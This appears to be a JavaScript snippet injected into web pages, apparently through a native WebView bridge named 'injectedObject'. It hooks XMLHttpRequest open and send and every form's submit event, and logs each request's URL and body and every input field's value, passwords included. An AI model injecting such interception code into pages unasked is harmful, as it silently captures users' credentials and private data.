function parseForm(event) {
    var form = this;
    var inputs = form.getElementsByTagName('input');
    var data = '[FORM REQUEST] '+ form.method.toUpperCase() +': [Data] ';

    for (var i = 0; i < inputs.length; i++) {
        var field = inputs[i];
        if (field.type != 'submit'){
            data += field.name + '=' + field.value + ' ';
        };
    }
    injectedObject.writeLog(data);
};

function parseAjaxData(data) {
    ajaxReq += ' [Data] ';
    inputs = data.split('&');
    for (var i = 0; i < inputs.length; i++) {
        ajaxReq += inputs[i]+' ';
    };
    injectedObject.writeLog(ajaxReq);
    ajaxReq = '';
};


XMLHttpRequest.prototype.realSend = XMLHttpRequest.prototype.send;
var newSend = function(data){
    if(method == "POST"){
        parseAjaxData(data);
    }
    else {
        injectedObject.writeLog(ajaxReq);
        ajaxReq = '';
    }
    this.realSend(data);
};
XMLHttpRequest.prototype.send = newSend;

var ajaxReq = '';
var reqOpen = XMLHttpRequest.prototype.open;
var method;
XMLHttpRequest.prototype.open = function(){
    ajaxReq += '[AJAX REQUEST] '+arguments[0]+ ': ';
    method = arguments[0];
    ajaxReq += '[TARGET] '+arguments[1];
    return reqOpen.apply(this, [].slice.call(arguments));
};

for (var form_idx = 0; form_idx < document.forms.length; ++form_idx){
    document.forms[form_idx].addEventListener('submit', parseForm, true);
}